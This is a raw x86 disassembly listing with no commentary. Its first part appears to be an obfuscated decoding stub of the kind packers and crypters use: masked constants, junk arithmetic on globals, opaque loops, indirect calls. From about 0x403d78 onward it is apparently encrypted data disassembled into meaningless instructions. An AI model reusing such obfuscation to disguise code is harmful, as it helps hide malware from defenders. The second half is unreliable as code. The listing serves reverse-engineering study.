  403a24:	mov    ecx,DWORD PTR ds:0x428ea5
  403a2a:	inc    ecx
  403a2b:	mov    DWORD PTR ds:0x428ea5,ecx
  403a31:	cmp    DWORD PTR ds:0x428ea5,0x1a
  403a38:	jae    0x403a68
  403a3e:	cmp    DWORD PTR ds:0x428ea5,0x24
  403a45:	jle    0x403a68
  403a4b:	jmp    0x403a63
  403a50:	push   0x428124
  403a55:	push   DWORD PTR [ebp-0x24]
  403a58:	push   0x8716
  403a5d:	call   DWORD PTR ds:0x42ca60
  403a63:	jmp    0x403a24
  403a68:	mov    ecx,DWORD PTR [ebp-0x18]
  403a6b:	xor    ecx,esi
  403a6d:	adc    DWORD PTR ds:0x428e49,0xcc9
  403a77:	inc    eax
  403a78:	inc    DWORD PTR [ebp-0x14]
  403a7b:	sub    DWORD PTR ds:0x428ed1,0x428e99
  403a85:	add    ecx,edi
  403a87:	cmp    eax,ecx
  403a89:	jb     0x4039b8
  403a8f:	not    DWORD PTR ds:0x428e69
  403a95:	mov    dl,BYTE PTR [ebp-0x21]
  403a98:	add    eax,DWORD PTR ds:0x428e2d
  403a9e:	mov    eax,DWORD PTR [ebp-0x34]
  403aa1:	adc    DWORD PTR ds:0x428e91,0x428e69
  403aab:	xor    al,0xb1
  403aad:	sbb    DWORD PTR ds:0x428e49,0x428e75
  403ab7:	mov    cl,0x8
  403ab9:	sub    cl,al
  403abb:	add    dl,cl
  403abd:	sub    DWORD PTR ds:0x428ea9,ecx
  403ac3:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ac6:	sbb    DWORD PTR ds:0x428ed1,0x428e31
  403ad0:	xor    cl,0xb1
  403ad3:	xor    DWORD PTR ds:0x428ea5,0x741f
  403add:	sub    cl,0x8
  403ae0:	sub    DWORD PTR ds:0x428e39,0x428eb9
  403aea:	ror    dl,cl
  403aec:	xor    eax,eax
  403aee:	mov    eax,ds:0x4292f9
  403af3:	xor    ecx,ecx
  403af5:	add    ecx,DWORD PTR ds:0x429be5
  403afb:	sub    eax,ecx
  403afd:	imul   eax,DWORD PTR [eax+ecx*1]
  403b01:	mov    eax,DWORD PTR [ebp-0xc]
  403b04:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403b0b:	mov    DWORD PTR ds:0x428e61,0x15
  403b15:	cmp    DWORD PTR ds:0x428e61,0x0
  403b1c:	je     0x403b74
  403b22:	cmp    DWORD PTR ds:0x428e61,0x5
  403b29:	jb     0x403b74
  403b2f:	jmp    0x403b49
  403b34:	push   0x42819a
  403b39:	push   0x0
  403b3b:	push   DWORD PTR [ebp-0x18]
  403b3e:	push   0x1deb
  403b43:	call   DWORD PTR ds:0x42ca64
  403b49:	cmp    DWORD PTR ds:0x428e61,0x6
  403b50:	jne    0x403b61
  403b56:	mov    eax,ds:0x428e61
  403b5b:	dec    eax
  403b5c:	mov    ds:0x428e61,eax
  403b61:	xor    eax,eax
  403b63:	xor    eax,DWORD PTR ds:0x428e61
  403b69:	dec    eax
  403b6a:	mov    ds:0x428e61,eax
  403b6f:	jmp    0x403b15
  403b74:	mov    eax,DWORD PTR [ebp-0xc]
  403b77:	mov    ecx,DWORD PTR [ebp-0x28]
  403b7a:	sub    eax,edi
  403b7c:	xor    eax,esi
  403b7e:	cmp    eax,ecx
  403b80:	jne    0x403baa
  403b86:	mov    eax,DWORD PTR [ebp-0x8]
  403b89:	mov    ecx,DWORD PTR [ebp-0x10]
  403b8c:	xor    eax,esi
  403b8e:	xor    ecx,esi
  403b90:	sub    eax,ecx
  403b92:	sub    eax,edi
  403b94:	xor    eax,esi
  403b96:	mov    DWORD PTR [ebp-0x8],eax
  403b99:	mov    eax,DWORD PTR [ebp-0x10]
  403b9c:	xor    eax,esi
  403b9e:	mov    ecx,0xffcd8d88
  403ba3:	sub    ecx,eax
  403ba5:	jmp    0x403bb9
  403baa:	mov    eax,DWORD PTR [ebp-0x10]
  403bad:	xor    eax,esi
  403baf:	mov    ecx,0xffcd8d08
  403bb4:	sub    ecx,eax
  403bb6:	add    ecx,DWORD PTR [ebp-0xc]
  403bb9:	mov    DWORD PTR [ebp-0xc],ecx
  403bbc:	mov    eax,DWORD PTR [ebp-0x8]
  403bbf:	cmp    eax,0xf89c85b9
  403bc4:	jne    0x4038a1
  403bca:	mov    DWORD PTR [ebp-0x34],0x9
  403bd1:	mov    ecx,DWORD PTR [ebp+0x8]
  403bd4:	xor    ecx,esi
  403bd6:	add    ecx,edi
  403bd8:	jmp    0x4084e6
  403bdd:	lea    eax,[ecx+ebx*1]
  403be0:	mov    DWORD PTR [ebp-0x2c],eax
  403be3:	mov    eax,DWORD PTR [ebp-0x58]
  403be6:	sub    eax,ecx
  403be8:	mov    DWORD PTR [ebp-0x1c],eax
  403beb:	mov    eax,DWORD PTR [ebp-0x1c]
  403bee:	mov    DWORD PTR [ebp-0x14],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x2c]
  403bf4:	mov    DWORD PTR [ebp-0x38],0xf89c85b9
  403bfb:	mov    DWORD PTR [ebp-0x54],eax
  403bfe:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  403c05:	mov    eax,DWORD PTR [ebp-0x38]
  403c08:	xor    eax,esi
  403c0a:	add    eax,edi
  403c0c:	mov    DWORD PTR [ebp-0x10],eax
  403c0f:	mov    eax,DWORD PTR [ebp-0x38]
  403c12:	xor    eax,esi
  403c14:	add    eax,edi
  403c16:	mov    DWORD PTR [ebp-0x8],eax
  403c19:	mov    DWORD PTR [ebp-0x2c],0xf89c8599
  403c20:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c27:	mov    eax,DWORD PTR [ebp-0x38]
  403c2a:	mov    edx,DWORD PTR [ebp-0x14]
  403c2d:	xor    eax,esi
  403c2f:	add    eax,edi
  403c31:	cmp    edx,eax
  403c33:	je     0x4084da
  403c39:	mov    eax,DWORD PTR [ebp-0x20]
  403c3c:	xor    eax,esi
  403c3e:	mov    edx,0xffcd8d08
  403c43:	sub    edx,eax
  403c45:	add    edx,DWORD PTR [ebp-0x14]
  403c48:	mov    eax,DWORD PTR [ebp-0x20]
  403c4b:	mov    ebx,DWORD PTR [ebp-0x10]
  403c4e:	xor    eax,esi
  403c50:	add    eax,edi
  403c52:	imul   eax,ebx
  403c55:	cmp    eax,edx
  403c57:	ja     0x4084d7
  403c5d:	mov    edx,DWORD PTR [ebp-0x10]
  403c60:	mov    eax,DWORD PTR [ebp-0x14]
  403c63:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c66:	sub    eax,edx
  403c68:	xor    ebx,esi
  403c6a:	xor    edx,edx
  403c6c:	add    ebx,edi
  403c6e:	div    ebx
  403c70:	mov    DWORD PTR [ebp-0x8],eax
  403c73:	mov    eax,DWORD PTR [ebp-0x44]
  403c76:	mov    edx,DWORD PTR [ebp-0x8]
  403c79:	xor    eax,esi
  403c7b:	add    eax,edi
  403c7d:	cmp    edx,eax
  403c7f:	jbe    0x403c8f
  403c85:	mov    eax,DWORD PTR [ebp-0x44]
  403c88:	xor    eax,esi
  403c8a:	add    eax,edi
  403c8c:	mov    DWORD PTR [ebp-0x8],eax
  403c8f:	mov    eax,DWORD PTR [ebp-0x2c]
  403c92:	mov    edx,DWORD PTR [ebp-0x8]
  403c95:	xor    eax,esi
  403c97:	add    eax,edi
  403c99:	imul   eax,edx
  403c9c:	mov    DWORD PTR [ebp-0x8],eax
  403c9f:	mov    eax,DWORD PTR [ebp-0x38]
  403ca2:	mov    edx,DWORD PTR [ebp-0x8]
  403ca5:	xor    eax,esi
  403ca7:	add    eax,edi
  403ca9:	cmp    edx,eax
  403cab:	je     0x4084c0
  403cb1:	mov    eax,DWORD PTR [ebp-0x8]
  403cb4:	mov    DWORD PTR [ebp-0x18],eax
  403cb7:	mov    eax,DWORD PTR [ebp-0x10]
  403cba:	add    eax,DWORD PTR [ebp-0x54]
  403cbd:	mov    DWORD PTR [ebp-0x1c],0xf89c85b9
  403cc4:	mov    DWORD PTR [ebp-0x8],eax
  403cc7:	mov    eax,0xf89c85b8
  403ccc:	mov    DWORD PTR [ebp-0x28],eax
  403ccf:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  403cd6:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  403cdd:	mov    DWORD PTR [ebp-0x30],eax
  403ce0:	mov    eax,DWORD PTR [ebp-0x1c]
  403ce3:	xor    eax,esi
  403ce5:	add    eax,edi
  403ce7:	jmp    0x40847c
  403cec:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  403cf3:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  403cfa:	mov    eax,DWORD PTR [ebp-0x30]
  403cfd:	mov    edx,DWORD PTR [ebp-0xc]
  403d00:	xor    eax,esi
  403d02:	add    eax,edi
  403d04:	imul   eax,edx
  403d07:	mov    edx,DWORD PTR [ebp-0x8]
  403d0a:	mov    al,BYTE PTR [eax+edx*1]
  403d0d:	mov    BYTE PTR [ebp-0x1],al
  403d10:	mov    eax,DWORD PTR [ebp-0x30]
  403d13:	mov    edx,DWORD PTR [ebp-0xc]
  403d16:	xor    eax,esi
  403d18:	add    eax,edi
  403d1a:	imul   eax,edx
  403d1d:	mov    edx,DWORD PTR [ebp-0x5c]
  403d20:	xor    edx,esi
  403d22:	add    eax,edx
  403d24:	mov    edx,DWORD PTR [ebp-0x8]
  403d27:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f8]
  403d2f:	mov    edx,DWORD PTR [ebp-0x4c]
  403d32:	xor    edx,esi
  403d34:	lea    eax,[edx+eax*1+0x3272f8]
  403d3b:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3f:	xor    edx,eax
  403d41:	mov    BYTE PTR [ebp-0x1],dl
  403d44:	mov    al,BYTE PTR [ebp-0x1]
  403d47:	mov    edx,DWORD PTR [ebp-0x30]
  403d4a:	mov    ebx,DWORD PTR [ebp-0xc]
  403d4d:	xor    edx,esi
  403d4f:	add    edx,edi
  403d51:	imul   edx,ebx
  403d54:	mov    ebx,DWORD PTR [ebp-0x8]
  403d57:	mov    BYTE PTR [edx+ebx*1],al
  403d5a:	mov    eax,DWORD PTR [ebp-0x30]
  403d5d:	mov    edx,DWORD PTR [ebp-0xc]
  403d60:	xor    eax,esi
  403d62:	add    eax,edi
  403d64:	imul   eax,edx
  403d67:	mov    edx,DWORD PTR [ebp-0x8]
  403d6a:	mov    al,BYTE PTR [eax+edx*1]
  403d6d:	mov    BYTE PTR [ebp-0x1],al
  403d70:	mov    eax,DWORD PTR [ebp-0x30]
  403d73:	jmp    0x4060ca
  403d78:	iret   
  403d79:	xor    ebp,eax
  403d7b:	jne    0x403de2
  403d7d:	jns    0x403dee
  403d7f:	cmp    edx,edi
  403d81:	mov    ecx,0x696d0752
  403d86:	add    eax,0x7b9eb5d8
  403d8b:	jnp    0x403d42
  403d8d:	sahf   
  403d8e:	jnp    0x403e0b
  403d90:	js     0x403d2b
  403d92:	iret   
  403d93:	scas   al,BYTE PTR es:[edi]
  403d94:	fwait
  403d95:	cmc    
  403d96:	mov    dh,0x90
  403d98:	xlat   BYTE PTR ds:[ebx]
  403d99:	inc    eax
  403d9a:	or     BYTE PTR [eax+0x66427c7],0xc2
  403da1:	mov    ebp,0x3cf3a2e6
  403da6:	ret    
  403da7:	sbb    BYTE PTR [ebx-0x4d],bh
  403daa:	sbb    ecx,edi
  403dac:	outs   dx,DWORD PTR ds:[esi]
  403dad:	and    al,0x70
  403daf:	add    BYTE PTR [eax-0x44],cl
  403db2:	and    cl,ah
  403db4:	fadd   QWORD PTR [edi]
  403db6:	mov    ch,0x6a
  403db8:	lahf   
  403db9:	add    al,0xad
  403dbb:	test   BYTE PTR [ebx-0x497847f],dh
  403dc1:	bound  esi,QWORD PTR [edi+0x52]
  403dc4:	mov    eax,ds:0xdbee0ef2
  403dc9:	xchg   edx,eax
  403dca:	push   ebp
  403dcb:	(bad)  
  403dcc:	out    dx,al
  403dcd:	mov    esp,0x699d832e
  403dd2:	cmp    BYTE PTR [ebx+0x72],bl
  403dd5:	add    DWORD PTR [ecx+edi*1+0x49],ebx
  403dd9:	or     DWORD PTR [edi-0x7a40f125],edx
  403ddf:	aam    0x95
  403de1:	xor    eax,0x605c33a4
  403de6:	aam    0xdf
  403de8:	pop    ss
  403de9:	ds addr16 cmc 
  403dec:	xchg   ebx,eax
  403ded:	mov    dh,0x51
  403def:	outs   dx,BYTE PTR ds:[esi]
  403df0:	pusha  
  403df1:	cld    
  403df2:	stc    
  403df3:	lock sub esi,esi
  403df6:	jnp    0x403da4
  403df8:	je     0x403e1d
  403dfa:	ins    DWORD PTR es:[edi],dx
  403dfb:	sub    cl,BYTE PTR [ebx+0x5dd9fa8e]
  403e01:	mov    edx,DWORD PTR [eax+0x11a46e4f]
  403e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e08:	ret    
  403e09:	add    al,0x86
  403e0b:	xchg   ebx,eax
  403e0c:	adc    eax,0x2d
  403e0f:	mov    edi,0x90b7fe5
  403e14:	ds xchg ebp,eax
  403e16:	hlt    
  403e17:	mov    edi,DWORD PTR [ecx+eiz*2-0x69a94bf6]
  403e1e:	jo     0x403df6
  403e20:	xor    DWORD PTR [ecx-0x31a6589],esp
  403e26:	test   al,0x77
  403e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e29:	fwait
  403e2a:	ret    0xc46b
  403e2d:	or     DWORD PTR ds:0x8867e0,edi
  403e33:	xchg   esp,eax
  403e34:	popa   
  403e35:	or     DWORD PTR [edx-0x7f],ecx
  403e38:	sbb    dh,BYTE PTR [ecx-0x6391e774]
  403e3e:	or     al,0xbf
  403e40:	int3   
  403e41:	dec    edi
  403e42:	jle    0x403e31
  403e44:	jne    0x403e3a
  403e46:	adc    BYTE PTR [edi],bh
  403e48:	xor    bh,al
  403e4a:	push   eax
  403e4b:	mov    ebp,DWORD PTR [edx+0x5b]
  403e4e:	cmp    BYTE PTR [bx+si],bl
  403e51:	sub    bh,0x4a
  403e54:	push   edi
  403e55:	leave  
  403e56:	out    0x69,eax
  403e58:	pop    edx
  403e59:	ins    BYTE PTR es:[edi],dx
  403e5a:	rcr    cl,0x43
  403e5d:	pop    edx
  403e5e:	jmp    0x5aa2585e
  403e63:	cmp    BYTE PTR [ebx-0x2a],cl
  403e66:	fimul  WORD PTR [esi+0x61]
  403e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e6a:	or     eax,0x1ea55ad7
  403e6f:	dec    edx
  403e70:	loop   0x403ed4
  403e72:	rcl    dl,1
  403e74:	xlat   BYTE PTR ds:[ebx]
  403e75:	or     DWORD PTR [edx+0xe],0x471815d9
  403e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e7d:	add    eax,0xbfe1473b
  403e82:	in     eax,0xf5
  403e84:	xchg   ebp,eax
  403e85:	nop
  403e86:	popf   
  403e87:	inc    esi
  403e88:	das    
  403e89:	or     DWORD PTR [ebx],ebx
  403e8b:	xor    ebp,DWORD PTR [ebp+0x5367055e]
  403e91:	inc    ebp
  403e92:	xchg   ebx,eax
  403e93:	shl    BYTE PTR [ebp-0xb815828],0x93
  403e9a:	or     DWORD PTR ds:0x8f90dc1d,edi
  403ea0:	in     eax,dx
  403ea1:	mov    cl,0x50
  403ea3:	mov    edi,0x133257b0
  403ea8:	sbb    BYTE PTR [ecx],0x70
  403eab:	jne    0x403e64
  403ead:	retf   
  403eae:	push   es
  403eaf:	aaa    
  403eb0:	loop   0x403e79
  403eb2:	out    0xc4,eax
  403eb4:	pop    es
  403eb5:	jno    0x403ec0
  403eb7:	lea    eax,[edx-0x62]
  403eba:	and    eax,0xce5355e9
  403ebf:	ror    edx,0xdc
  403ec2:	and    eax,0xaed1a6b6
  403ec7:	ds js  0x403f41
  403eca:	and    dh,BYTE PTR cs:[edi]
  403ecd:	not    BYTE PTR [eax+esi*2]
  403ed0:	push   ebp
  403ed1:	(bad)  
  403ed2:	adc    eax,edx
  403ed4:	fisttp QWORD PTR [edi+esi*1-0xd]
  403ed8:	jo     0x403e72
  403eda:	fcomp  st(5)
  403edc:	xor    al,0x13
  403ede:	pop    ebx
  403edf:	inc    esi
  403ee0:	iret   
  403ee1:	dec    edi
  403ee2:	xchg   ecx,eax
  403ee3:	jno    0x403efe
  403ee5:	add    BYTE PTR [edx+0x500213aa],dh
  403eeb:	mov    ch,0x25
  403eed:	dec    ebx
  403eee:	inc    edx
  403eef:	adc    BYTE PTR [edx-0x38be0b0b],dh
  403ef5:	mov    edi,0x94bc404d
  403efa:	mov    es,WORD PTR [ebx]
  403efc:	sbb    edx,DWORD PTR [ebx]
  403efe:	sbb    edi,DWORD PTR [edx+0x60]
  403f01:	mov    esi,0x5fc06dd1
  403f06:	xlat   BYTE PTR ds:[ebx]
  403f07:	inc    edi
  403f08:	pop    esp
  403f09:	jne    0x403ec4
  403f0b:	icebp  
  403f0c:	or     ecx,ebp
  403f0e:	xor    ebx,DWORD PTR [edx]
  403f10:	(bad)  
  403f11:	pop    eax
  403f12:	adc    esi,eax
  403f14:	or     esp,ebp
  403f16:	ror    BYTE PTR [esp+edx*1],cl
  403f19:	dec    esp
  403f1a:	mov    ch,0xa9
  403f1c:	push   cs
  403f1d:	mov    ah,0xe1
  403f1f:	addr16 and eax,0xe61d8e3c
  403f25:	jge    0x403f5e
  403f27:	inc    ebx
  403f28:	adc    ch,BYTE PTR [ebx-0x58438144]
  403f2e:	ret    0x8a42
  403f31:	imul   esi,DWORD PTR [esi+ebp*2+0x7f],0x19d686a9
  403f39:	xchg   ecx,eax
  403f3a:	or     eax,0x8edc0eee
  403f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f40:	mov    edx,ebx
  403f42:	shr    DWORD PTR [ebx-0x29],cl
  403f45:	add    esi,DWORD PTR ss:[esi+esi*8]
  403f49:	sub    al,0x51
  403f4b:	ja     0x403f55
  403f4d:	jmp    0x403fb7
  403f4f:	jp     0x4a8581fd
  403f55:	mov    cl,ah
  403f57:	jge    0x403f18
  403f59:	pop    ecx
  403f5a:	pop    edi
  403f5b:	xchg   BYTE PTR [ebx+0x657543a5],dl
  403f61:	and    BYTE PTR [edi],cl
  403f63:	push   eax
  403f64:	lods   al,BYTE PTR ds:[esi]
  403f65:	add    esp,ecx
  403f67:	cli    
  403f68:	adc    BYTE PTR [ecx+ebx*2+0x44973],ch
  403f6f:	inc    eax
  403f70:	stc    
  403f71:	daa    
  403f72:	in     al,dx
  403f73:	jmp    DWORD PTR [ebx-0x55cb8873]
  403f79:	fs or  dh,ch
  403f7c:	push   esi
  403f7d:	fadd   DWORD PTR [eax-0x1b3d464e]
  403f83:	and    edi,ebp
  403f85:	ins    BYTE PTR es:[edi],dx
  403f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f87:	add    dl,BYTE PTR [eax]
  403f89:	inc    edx
  403f8a:	pmulhuw mm0,QWORD PTR [eax]
  403f8d:	inc    esp
  403f8e:	ror    al,1
  403f90:	cmp    ah,BYTE PTR [ebp-0x3a]
  403f93:	das    
  403f94:	popa   
  403f95:	imul   ebp,eax,0xa6520077
  403f9b:	mov    esi,0xa8aec229
  403fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa1:	jge    0x403ff6
  403fa3:	add    eax,eax
  403fa5:	dec    esi
  403fa6:	es push ss
  403fa8:	ror    BYTE PTR [ebp-0x13],1
  403fab:	and    BYTE PTR [esp+eax*2+0x6a56eb28],0x3b
  403fb3:	div    dh
  403fb5:	inc    ecx
  403fb6:	and    DWORD PTR [esi+edi*2],edx
  403fb9:	fabs   
  403fbb:	cmp    DWORD PTR [eax],eax
  403fbd:	(bad)  
  403fbe:	xor    al,0x62
  403fc0:	dec    esi
  403fc1:	arpl   WORD PTR [ebp-0x70],bx
  403fc4:	scas   al,BYTE PTR es:[edi]
  403fc5:	pop    eax
  403fc6:	(bad)
  403fca:	inc    ecx
  403fcb:	mov    esp,0x41f178f0
  403fd0:	jae    0x404020
  403fd2:	sub    eax,0x9cef350c
  403fd7:	xchg   esp,eax
  403fd8:	lahf   
  403fd9:	clc    
  403fda:	test   al,0xce
  403fdc:	addr16 call 0x6ca0:0x68cafafc
  403fe4:	inc    edi
  403fe5:	jecxz  0x403fb1
  403fe7:	adc    BYTE PTR [edi+0x1a44208c],dh
  403fed:	in     al,0x6f
  403fef:	add    eax,0xff4f8b44
  403ff4:	xchg   edi,eax
  403ff5:	retf   
  403ff6:	or     BYTE PTR [esi+0x6d],0xa6
  403ffa:	add    eax,0x833d4d12
  403fff:	push   ss
  404000:	and    al,0xa6
  404002:	or     ebx,DWORD PTR [esi]
  404004:	lods   al,BYTE PTR ds:[esi]
  404005:	popa   
  404006:	fst    st(3)
  404008:	popa   
  404009:	jle    0x403fd6
  40400b:	aam    0xf6
  40400d:	add    BYTE PTR [ebx],dh
  40400f:	cmp    edx,edx
  404011:	arpl   WORD PTR [edi],di
  404013:	mov    ds:0x156e74d0,eax
  404018:	cmp    eax,0x52b198c4
  40401d:	fiadd  DWORD PTR [edx+0xa]
  404020:	or     al,0xc2
  404022:	push   ecx
  404023:	clc    
  404024:	dec    ecx
  404025:	push   ebp
  404026:	enter  0x81df,0xfb
  40402a:	mov    ah,0xf3
  40402c:	mov    edx,0x4266da5a
  404031:	inc    esi
  404032:	clc    
  404033:	adc    cl,al
  404035:	sar    DWORD PTR [ecx+0x79],cl
  404038:	jecxz  0x40400b
  40403a:	jnp    0x403ff4
  40403c:	push   ebp
  40403d:	icebp  
  40403e:	and    al,0xb7
  404040:	xor    DWORD PTR ds:0xf44f7169,ecx
  404046:	mov    cl,0x5a
  404048:	(bad)  
  404049:	jl     0x403ff0
  40404b:	int    0x67
  40404d:	cmp    eax,DWORD PTR [eax]
  40404f:	cdq    
  404050:	pusha  
  404051:	leave  
  404052:	repz int 0x9e
  404055:	inc    esi
  404056:	xchg   edi,eax
  404057:	or     edi,DWORD PTR [eax+eiz*2+0x774e60c4]
  40405e:	push   ds
  40405f:	ror    DWORD PTR [edx+0x75d3a9c2],1
  404065:	cmp    al,0xa4
  404067:	sub    esp,ebp
  404069:	push   esi
  40406a:	mov    ah,0x3f
  40406c:	lods   al,BYTE PTR ds:[esi]
  40406e:	cmp    al,0x3c
  404070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404071:	pop    es
  404072:	adc    BYTE PTR [ebx],ah
  404074:	aaa    
  404075:	sbb    ebx,DWORD PTR [edx-0x1d0e1859]
  40407b:	ss (bad) 
  40407d:	sti    
  40407e:	adc    BYTE PTR gs:[edx],dl
  404081:	fcomp  QWORD PTR [edx]
  404083:	int    0x68
  404085:	push   eax
  404086:	icebp  
  404087:	cmp    eax,0xf9150be8
  40408c:	lock cld 
  40408e:	imul   ebp,DWORD PTR [edi],0x6eb548b7
  404094:	cmp    edi,esi
  404096:	push   ebx
  404097:	mov    gs,ecx
  404099:	gs pop edx
  40409b:	test   ebp,edi
  40409d:	pop    esi
  40409e:	mov    esi,0xc74464d0
  4040a3:	ret    
  4040a4:	rcr    BYTE PTR [ecx+0x65],1
  4040a7:	pusha  
  4040a8:	pusha  
  4040a9:	mov    al,ds:0xf61bfaf3
  4040ae:	or     cl,dl
  4040b0:	(bad)  
  4040b2:	loop   0x40411a
  4040b4:	cli    
  4040b5:	adc    al,0x4d
  4040b7:	retf   
  4040b8:	mov    DWORD PTR [eax],ebp
  4040ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040bb:	jns    0x4040d4
  4040bd:	dec    edx
  4040be:	jb     0x404041
  4040c0:	jmp    0x2c8c70f4
  4040c5:	outs   dx,BYTE PTR ds:[esi]
  4040c6:	or     DWORD PTR [eax+0x68],esi
  4040c9:	aam    0x79
  4040cb:	cmc    
  4040cc:	mov    ebx,0x66dfbf1c
  4040d1:	add    cl,al
  4040d3:	xchg   esp,eax
  4040d4:	jp     0x40412f
  4040d6:	inc    esp
  4040d7:	sub    BYTE PTR [ebx],bl
  4040d9:	adc    eax,0xfe05fd1a
  4040de:	jle    0x40406d
  4040e0:	jae    0x40415b
  4040e2:	repz xor esp,DWORD PTR [ecx]
  4040e5:	adc    al,0x86
  4040e7:	pop    ss
  4040e8:	sub    BYTE PTR [ecx+0x6bd2af15],0xb6
  4040ef:	jns    0x4040f6
  4040f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040f2:	sub    BYTE PTR [edx],cl
  4040f4:	stos   BYTE PTR es:[edi],al
  4040f5:	add    BYTE PTR [edx],dh
  4040f7:	rcr    DWORD PTR [eax-0x4d8081a8],0xf3
  4040fe:	mov    dl,0xd7
  404100:	(bad)  
  404102:	repz mul BYTE PTR [edx+0x4a21897c]
  404109:	jp     0x404139
  40410b:	mov    bh,0x4b
  40410d:	jno    0x4040dc
  40410f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404110:	xchg   edx,eax
  404111:	jg     0x404167
  404113:	dec    ebp
  404114:	(bad)  
  404115:	mov    eax,DWORD PTR [ebp-0x6c897c84]
  40411b:	pop    edx
  40411c:	(bad)  
  40411d:	enter  0xf12,0x95
  404121:	dec    ebx
  404122:	int    0x1c
  404124:	dec    eax
  404125:	cmc    
  404126:	scas   eax,DWORD PTR es:[edi]
  404127:	inc    edi
  404128:	xor    edi,edi
  40412a:	dec    ebp
  40412b:	es jae 0x40415b
  40412e:	adc    eax,0x94934cd8
  404133:	push   eax
  404134:	mov    edx,0xa2b9f17f
  404139:	popa   
  40413a:	sub    al,0xbe
  40413c:	push   0x76
  40413e:	test   DWORD PTR [eax+eax*2+0x4678c98f],eax
  404145:	shl    BYTE PTR ds:0x743eb9cc,1
  40414b:	inc    esi
  40414c:	mov    BYTE PTR [edx+edx*4-0xd],dl
  404150:	dec    edx
  404151:	fnstenv ds:0x4cece0f5
  404157:	sar    DWORD PTR [ebx-0x58],1
  40415a:	jb     0x40410e
  40415c:	pop    ds
  40415d:	mov    ebx,0x4f756013
  404162:	out    0x66,eax
  404164:	out    dx,eax
  404165:	fbstp  TBYTE PTR [esi+0x79]
  404168:	daa    
  404169:	aam    0xe1
  40416b:	mov    ecx,0x2663a10e
  404170:	scas   eax,DWORD PTR es:[edi]
  404171:	adc    BYTE PTR [esi+0x0],dl
  404174:	push   DWORD PTR [edx]
  404176:	dec    ebx
  404177:	pusha  
  404178:	lods   eax,DWORD PTR ds:[esi]
  404179:	lock into 
  40417b:	xchg   edi,eax
  40417c:	(bad)  
  40417d:	fdivr  QWORD PTR [edi+0x49]
  404180:	retf   0xc619
  404183:	sti    
  404184:	mov    ebp,0xac51a341
  404189:	call   0xb7d5c4ee
  40418e:	adc    edi,DWORD PTR [ecx]
  404190:	inc    ebp
  404191:	hlt    
  404192:	data16 or ch,cl
  404195:	inc    eax
  404196:	sub    al,0x4a
  404198:	dec    ebp
  404199:	pop    eax
  40419a:	ins    DWORD PTR es:[edi],dx
  40419b:	retf   
  40419c:	or     al,0xc6
  40419e:	pop    ecx
  40419f:	xor    BYTE PTR [ebx+eiz*8+0x3e6a44d9],bl
  4041a6:	inc    ebx
  4041a7:	hlt    
  4041a8:	cmp    ch,BYTE PTR [ebx-0x408c6bd]
  4041ae:	call   0x37c:0x8f2e5833
  4041b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b6:	sbb    dl,dh
  4041b8:	ret    0xa822
  4041bb:	pop    ebx
  4041bc:	into   
  4041bd:	jle    0x404166
  4041bf:	iret   
  4041c0:	mov    bl,0x3d
  4041c2:	mov    esp,db3
  4041c5:	call   DWORD PTR [ebp-0x6963de46]
  4041cb:	push   cs
  4041cc:	cmp    BYTE PTR [ebx],ah
  4041ce:	shr    DWORD PTR [ecx],cl
  4041d0:	add    BYTE PTR [ebx],cl
  4041d2:	add    bh,ch
  4041d4:	(bad)  
  4041d5:	mov    ecx,0xa2ba1263
  4041da:	das    
  4041db:	and    al,0x7a
  4041dd:	stc    
  4041de:	add    BYTE PTR [ebx-0x68d35066],0x7a
  4041e5:	add    eax,0xa4412952
  4041ea:	or     al,0xe3
  4041ec:	ds mov esi,0xda38e9ad
  4041f2:	jecxz  0x4041dc
  4041f4:	lahf   
  4041f5:	rcr    DWORD PTR [eax],1
  4041f7:	pop    edx
  4041f8:	enter  0x81c0,0x58
  4041fc:	lahf   
  4041fd:	mov    ecx,eax
  4041ff:	rol    DWORD PTR [edi],1
  404201:	mov    ah,0x6d
  404203:	int3   
  404204:	loop   0x4041d2
  404206:	(bad)  
  404207:	fnstcw WORD PTR [eax+eiz*8-0x67]
  40420b:	rcl    DWORD PTR ds:0x8b60bb61,1
  404211:	lahf   
  404212:	data16 outs dx,BYTE PTR ds:[esi]
  404214:	lea    ebp,[edi-0x63]
  404217:	adc    al,0xc0
  404219:	fwait
  40421a:	addr16 je 0x404201
  40421d:	icebp  
  40421e:	mov    DWORD PTR [ecx+0x3b],ecx
  404221:	std    
  404222:	(bad)  
  404223:	sar    BYTE PTR ds:[esi+0x31],0x74
  404228:	sub    eax,0x7452096a
  40422d:	das    
  40422e:	push   cs
  40422f:	into   
  404230:	scas   eax,DWORD PTR es:[edi]
  404231:	adc    al,0x86
  404233:	push   edx
  404234:	imul   esp,DWORD PTR [edi-0x4a],0xfcba364a
  40423b:	mov    edi,0x49f6571b
  404240:	inc    ecx
  404241:	aam    0x5
  404243:	fist   DWORD PTR [esi]
  404245:	mov    ch,0xa
  404247:	mov    ch,0xa8
  404249:	xchg   edx,eax
  40424a:	mov    edi,0x4372dc50
  40424f:	(bad)  
  404250:	or     ecx,DWORD PTR [ebx+0x4a]
  404253:	cmc    
  404254:	add    BYTE PTR [edi+0x1e],0xf3
